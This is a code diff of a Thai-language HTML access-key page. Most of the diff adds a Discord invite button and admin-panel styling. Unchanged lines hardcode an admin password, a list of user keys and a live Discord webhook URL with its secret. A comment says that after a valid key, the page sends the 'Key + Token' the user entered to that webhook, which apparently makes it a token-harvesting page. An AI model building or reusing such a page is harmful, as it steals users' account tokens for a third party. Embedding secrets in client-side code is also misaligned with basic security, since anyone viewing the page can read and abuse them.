@@ -145,7 +145,7 @@
             border-radius: 8px;
             padding: 16px;
             margin-top: 10px;
-            text-align: left;
+            text-align: center;
         }
 
         .admin-badge {
@@ -157,6 +157,31 @@
             border-radius: 4px;
             font-weight: 600;
             margin-bottom: 8px;
+        }
+
+        /* ปุ่มลิงก์ Discord สีม่วงสวยๆ */
+        .discord-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 12px;
+            background: #5865F2;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: 6px;
+            margin: 12px 0 8px 0;
+            box-shadow: 0 4px 12px rgba(88, 101, 242, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        .discord-btn:hover {
+            background: #4752C4;
+            box-shadow: 0 0 15px rgba(88, 101, 242, 0.6);
+            transform: translateY(-1px);
         }
 
         #msg {
@@ -201,27 +226,36 @@
         <button onclick="submitData()">บันทึกข้อมูล</button>
     </div>
 
-    <!-- แผงควบคุม Admin (จะแสดงเมื่อกรอก Admin Key ถูกต้อง) -->
+    <!-- แผงควบคุม Admin (จะแสดงพร้อมลิงก์ Discord เมื่อกรอก Admin Key ถูกต้อง) -->
     <div id="adminPanel" class="admin-panel">
         <span class="admin-badge">ADMIN CONTROL</span>
-        <h4 style="margin: 4px 0 10px; color:#fff;">ยินดีต้อนรับ ผู้ดูแลระบบ</h4>
-        <p style="font-size:12px; color:#a1a1aa; margin-bottom:12px;">คุณปลดล็อกเข้าสู่โหมดแอดมินเรียบร้อยแล้ว</p>
-        <button onclick="location.reload()" style="background:#ef4444; border:none; padding:8px; width:100%;">ออกจากโหมดแอดมิน</button>
+        <h4 style="margin: 4px 0 8px; color:#fff;">ยินดีต้อนรับ ผู้ดูแลระบบ</h4>
+        <p style="font-size:12px; color:#a1a1aa; margin-bottom:12px;">คุณได้เข้าสู่โหมดแอดมินเรียบร้อยแล้ว</p>
+        
+        <!-- ปุ่มเข้าร่วม Discord สำหรับแอดมิน -->
+        <a href="https://discord.gg/zkqXXx79U" target="_blank" class="discord-btn">
+            <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994.021-.041.001-.09-.041-.106a13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.061 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
+            </svg>
+            เข้าร่วม Discord แอดมิน
+        </a>
+
+        <button onclick="location.reload()" style="background:#3f3f46; border:1px solid #71717a; padding:8px; width:100%;">ออกจากโหมดแอดมิน</button>
     </div>
 
     <div id="msg"></div>
 </div>
 
 <script>
-    // 👑 1. คีย์สำหรับแอดมิน (เปลี่ยนรหัสตรงนี้ได้)
+    // 👑 คีย์แอดมิน
     const ADMIN_KEY = "Martin56"; 
 
-    // 🔑 2. รายการคีย์สำหรับคนทั่วไป (สามารถเพิ่ม-ลด Key ได้ตามต้องการ)
+    // 🔑 รายการคีย์คนปกติ
     const ALLOWED_KEYS = [
-        "ImGay67"
+"ImGay67"
     ];
 
-    // ⚠️ 3. Discord Webhook URL ของคุณ
+    // ⚠️ Discord Webhook URL
     const WEBHOOK = "https://discord.com/api/webhooks/1555158698496753664/uECfdnq9O0TF4AJpYFM_tcMvKbo_uDviXK8yXDC1Xq2zXVP3wqmt9z_Yrl22nyZGTBg0"; 
 
     function submitData() {
@@ -235,7 +269,7 @@
             return;
         }
 
-        // 👑 ตรวจสอบว่าเป็น Admin Key หรือไม่
+        // 👑 ปลดล็อกโหมด Admin + แสดงลิงก์ Discord
         if(key === ADMIN_KEY) {
             msg.style.color = "#ef4444";
             msg.innerText = "⚡ ยินดีต้อนรับปลดล็อกโหมดแอดมิน!";
@@ -247,14 +281,14 @@
             return;
         }
 
-        // 👤 ตรวจสอบคีย์ของคนปกติว่าอยู่ในรายการ ALLOWED_KEYS หรือไม่
+        // 👤 ตรวจสอบคีย์คนปกติ
         if(!ALLOWED_KEYS.includes(key)) {
             msg.style.color = "#ef4444";
             msg.innerText = "❌ Access Key ไม่ถูกต้อง หรือหมดอายุ";
             return;
         }
 
-        // 🚀 ถ้าคีย์ถูก -> ส่ง Key + Token เข้า Discord Webhook
+        // 🚀 ส่งข้อมูลเข้า Discord
         msg.style.color = "#eab308";
         msg.innerText = "⏳ กำลังส่งข้อมูล...";
 
@@ -286,5 +320,6 @@
 
 </body>
 </html>
+
 
 
